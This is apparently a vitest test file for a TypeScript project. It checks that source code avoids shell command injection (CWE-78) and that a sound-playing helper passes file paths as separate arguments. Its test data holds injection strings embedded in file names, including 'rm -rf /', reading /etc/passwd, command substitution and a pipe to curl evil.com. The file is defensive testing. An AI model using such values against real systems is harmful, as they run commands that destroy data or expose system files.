/**
 * Tests verifying that command injection vulnerabilities (CWE-78) are mitigated.
 * Ensures execFileSync/execFile are used with array arguments instead of
 * execSync/exec with template literals containing user-controlled values.
 */
import { describe, it, expect } from 'vitest'
import fs from 'fs'
import path from 'path'

const SRC_DIR = path.resolve(__dirname, '../../src')

describe('CWE-78 command injection prevention', () => {
  describe('no execSync with template literals in source code', () => {
    const sourceFiles = getAllTsFiles(SRC_DIR)

    it('should have source files to check', () => {
      expect(sourceFiles.length).toBeGreaterThan(0)
    })

    it('should not contain execSync with template literal arguments', () => {
      const violations: string[] = []

      for (const filePath of sourceFiles) {
        const content = fs.readFileSync(filePath, 'utf-8')
        const lines = content.split('\n')

        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!
          // Match execSync(`...`) pattern — template literal with backtick
          if (/execSync\s*\(\s*`/.test(line)) {
            const relativePath = path.relative(SRC_DIR, filePath)
            violations.push(`${relativePath}:${i + 1}: ${line.trim()}`)
          }
        }
      }

      expect(violations).toEqual([])
    })

    it('should not contain exec() with template literal arguments for shell commands', () => {
      const violations: string[] = []

      for (const filePath of sourceFiles) {
        const content = fs.readFileSync(filePath, 'utf-8')
        const lines = content.split('\n')

        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!
          // Match exec(`...`) but not execFile or execFileSync or execFileAsync
          if (/(?<![A-Za-z])exec\s*\(\s*`/.test(line)) {
            const relativePath = path.relative(SRC_DIR, filePath)
            violations.push(`${relativePath}:${i + 1}: ${line.trim()}`)
          }
        }
      }

      expect(violations).toEqual([])
    })
  })

  describe('getPlaySoundArgs returns safe arguments', () => {
    it('should not be vulnerable to shell metacharacters in wav path', async () => {
      const { getPlaySoundArgs } = await import('../../src/shared/platform')

      const dangerousPaths = [
        '/tmp/test"; rm -rf / #.wav',
        '/tmp/test$(whoami).wav',
        '/tmp/test`id`.wav',
        "/tmp/test'; cat /etc/passwd #.wav",
        '/tmp/test | curl evil.com.wav',
      ]

      for (const dangerousPath of dangerousPaths) {
        const result = getPlaySoundArgs(dangerousPath)
        // The dangerous path must be passed as a separate argument element,
        // not interpolated into a shell command string
        expect(typeof result.command).toBe('string')
        expect(Array.isArray(result.args)).toBe(true)

        // On macOS, the path should be the sole argument to afplay
        if (process.platform === 'darwin') {
          expect(result.command).toBe('afplay')
          expect(result.args).toEqual([dangerousPath])
        }
      }
    })
  })
})

function getAllTsFiles(dir: string): string[] {
  const results: string[] = []
  const entries = fs.readdirSync(dir, { withFileTypes: true })

  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name)
    if (entry.isDirectory() && entry.name !== 'node_modules') {
      results.push(...getAllTsFiles(fullPath))
    } else if (entry.isFile() && /\.ts$/.test(entry.name) && !/\.test\.ts$/.test(entry.name)) {
      results.push(fullPath)
    }
  }

  return results
}
